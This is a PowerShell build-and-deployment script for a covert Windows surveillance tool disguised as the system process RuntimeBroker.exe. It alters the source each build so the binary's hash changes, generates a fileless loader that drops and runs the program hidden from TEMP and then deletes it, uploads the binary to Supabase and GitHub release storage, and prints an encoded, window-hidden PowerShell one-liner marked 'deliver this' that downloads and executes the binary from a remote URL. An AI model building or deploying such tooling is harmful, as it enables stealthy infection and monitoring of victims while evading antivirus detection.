$env:Path = "C:\msys64\ucrt64\bin;" + $env:Path

powershell -ExecutionPolicy Bypass -File encrypt_config.ps1
if (!$?) { Write-Output "Config encryption failed"; exit 1 }

windres version.rc -O coff -o version.res
if (!$?) { Write-Output "Resource compilation failed"; exit 1 }

$buildVersion = [int][double]::Parse((Get-Date -UFormat %s))

# Append random stub to shift binary layout (unique hash per build)
$stubGuid = [System.Guid]::NewGuid().ToString("N")
Add-Content -Path "monitor.cpp" -Value "int _s$stubGuid(void){return 0;}"

g++ -static -Os -s -shared capture_dll.cpp -lole32 -loleaut32 -lstrmiids -luuid -lgdiplus -lgdi32 -o capture_dll.dll
if (!$?) { Write-Output "DLL compilation failed"; exit 1 }

windres capture_dll.rc -O coff -o capture_dll.res
if (!$?) { Write-Output "DLL resource compilation failed"; exit 1 }

g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res capture_dll.res -lwinhttp -lcrypt32 -lgdiplus -lole32 -loleaut32 -lstrmiids -luuid -lbcrypt -o RuntimeBroker.exe
if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Remove-Item -Force capture_dll.res -ErrorAction SilentlyContinue; Write-Output "Compilation failed"; exit 1 }

# Remove the random stub we appended (instead of git checkout which reverts all changes)
$mc = Get-Content -Path "monitor.cpp"
if ($mc.Count -gt 0 -and $mc[-1] -match '^int _s[0-9a-f]+\(void\)\{return 0;\}$') {
    $mc = $mc[0..($mc.Count - 2)]
    Set-Content -Path "monitor.cpp" -Value $mc
}

Remove-Item -Force version.res -ErrorAction SilentlyContinue
Remove-Item -Force capture_dll.res -ErrorAction SilentlyContinue
Remove-Item -Force capture_dll.dll -ErrorAction SilentlyContinue
# upx --ultra-brute RuntimeBroker.exe

# Generate loader.ps1 (fileless delivery)
$exeBytes = [IO.File]::ReadAllBytes("RuntimeBroker.exe")
$b64 = [Convert]::ToBase64String($exeBytes)
$loader = @"
`$d = "$b64"
`$b = [Convert]::FromBase64String(`$d)
`$p = "`$env:TEMP\RuntimeBroker.exe"
[IO.File]::WriteAllBytes(`$p, `$b)
Start-Process -WindowStyle Hidden `$p
Start-Sleep -Milliseconds 500
Remove-Item `$p -Force
"@
Set-Content -Path "loader.ps1" -Value $loader

# Upload to Supabase Storage + print one-liner
$sbUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co"
$envConfig = @{}
Get-Content "config.env" | Where-Object { $_ -match '^(\w+)=(.+)' } | ForEach-Object {
    $envConfig[$matches[1]] = $matches[2]
}
$svKey = $envConfig["SUPABASE_SERVICE_KEY"]
$headers = @{ "apikey" = $svKey; "Authorization" = "Bearer $svKey" }
$bucket = "Netpen"
$object = "RuntimeBroker.exe"

# Upload version.txt first (so agents see it before the new exe)
$verHeaders = $headers.Clone()
$verHeaders["Content-Type"] = "text/plain"
$verHeaders["x-upsert"] = "true"
try {
    $verBytes = [System.Text.Encoding]::UTF8.GetBytes($buildVersion.ToString())
    Invoke-RestMethod -Uri "$sbUrl/storage/v1/object/$bucket/version.txt" -Method Put -Headers $verHeaders -Body $verBytes -ErrorAction Stop | Out-Null
    Write-Output "Version $buildVersion uploaded"
} catch {
    Write-Output "WARNING: version.txt upload failed, build continues"
}

# Upload exe to Supabase Storage (one-liner delivery)
$exeData = [IO.File]::ReadAllBytes("RuntimeBroker.exe")
$uploadHeaders = $headers.Clone()
$uploadHeaders["Content-Type"] = "application/octet-stream"
$uploadHeaders["x-upsert"] = "true"
try {
    Invoke-RestMethod -Uri "$sbUrl/storage/v1/object/$bucket/$object" -Method Put -Headers $uploadHeaders -Body $exeData -ErrorAction Stop | Out-Null
    Write-Output "Uploaded to: $sbUrl/storage/v1/object/public/$bucket/$object"
    # Upload to GitHub Releases as fallback delivery URL
    $ghToken = $envConfig["GITHUB_TOKEN"]
    $ghOwner = "Danteh3-lab"; $ghRepo = "all-seeing"
    if ($ghToken) {
        try {
            $ghHeaders = @{ "Authorization" = "Bearer $ghToken"; "Accept" = "application/vnd.github+json" }
            $ghRelease = Invoke-RestMethod -Uri "https://api.github.com/repos/$ghOwner/$ghRepo/releases/tags/runtime" -Headers $ghHeaders -ErrorAction Stop
            $ghAssets = Invoke-RestMethod -Uri "https://api.github.com/repos/$ghOwner/$ghRepo/releases/$($ghRelease.id)/assets" -Headers $ghHeaders -ErrorAction SilentlyContinue
            $old = $ghAssets | Where-Object { $_.name -eq "RuntimeBroker.exe" }
            if ($old) { Invoke-RestMethod -Uri "https://api.github.com/repos/$ghOwner/$ghRepo/releases/assets/$($old.id)" -Method Delete -Headers $ghHeaders -ErrorAction SilentlyContinue | Out-Null }
            Invoke-RestMethod -Uri "https://uploads.github.com/repos/$ghOwner/$ghRepo/releases/$($ghRelease.id)/assets?name=RuntimeBroker.exe" -Method Post -Headers $ghHeaders -ContentType "application/octet-stream" -Body $exeData -ErrorAction Stop | Out-Null
            Write-Output "GitHub release asset uploaded"
        } catch { Write-Output "WARNING: GitHub upload failed, continuing" }
    } else { Write-Output "WARNING: GITHUB_TOKEN not set, skipping GitHub upload" }
    Write-Output ""
    Write-Output "=== ONE-LINER (deliver this) ==="
    $rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');`$p=`$env:tmp+'\a.exe';[IO.File]::WriteAllBytes(`$p,`$b);start `$p"
    $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
    $encCmd = [Convert]::ToBase64String($encBytes)
    Write-Output "powershell -w h -Enc $encCmd"
    Write-Output "=================================="
} catch {
    Write-Output ""
    Write-Output "=== UPLOAD FAILED ==="
    Write-Output "Check the error above"
    Write-Output "====================="
    Write-Output ""
}

Write-Output "Build successful: RuntimeBroker.exe + loader.ps1"
